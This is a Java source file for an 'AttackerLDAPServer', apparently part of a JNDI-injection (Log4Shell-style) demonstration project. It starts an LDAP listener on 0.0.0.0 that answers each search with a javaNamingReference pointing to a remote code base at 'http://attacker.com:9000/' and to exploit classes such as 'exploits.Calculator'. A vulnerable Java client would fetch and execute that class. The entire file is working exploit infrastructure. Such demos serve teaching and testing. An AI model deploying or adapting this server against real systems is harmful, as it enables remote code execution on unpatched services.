package com.example.attackerservice;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import lombok.extern.slf4j.Slf4j;

import javax.annotation.PostConstruct;
import javax.annotation.PreDestroy;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

@Slf4j
public class AttackerLDAPServer extends InMemoryOperationInterceptor {

    private final String LDAP_ROOT = "dc=example,dc=com";
    private final URL codeBase;
    private final int port;
    private final Map<String, String> dnMap;
    private InMemoryDirectoryServer ds;

    public AttackerLDAPServer() throws MalformedURLException {
        this(389, new URL("http://attacker.com:9000/")); // was api/
    }

    public AttackerLDAPServer(int port, URL codeBase) {
        this.port = port;
        this.codeBase = codeBase;
        this.dnMap = new HashMap<>();
        dnMap.put("Calculator", "exploits.Calculator");
        dnMap.put("YouTube", "exploits.YouTube");
    }

    @PostConstruct
    public void start() {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_ROOT);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(this);
            ds = new InMemoryDirectoryServer(config);
            log.info("Starting Attacker LDAP Server on port: {}", port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    @PreDestroy
    public void stop() {
        log.info("Stopping Attacker LDAP Server on port: {}", port);
        ds.shutDown(true);
    }

    @Override
    public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
        String base = result.getRequest().getBaseDN();

        Entry entry = new Entry(base);
        try {
            entry.addAttribute("javaClassName", dnMap.get(base));
            entry.addAttribute("javaCodeBase", codeBase.toString());
            entry.addAttribute("objectClass", "javaNamingReference");
            entry.addAttribute("javaFactory", dnMap.get(base));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
        catch ( Exception e ) {
            log.error("error processing search result", e);
        }
    }
}
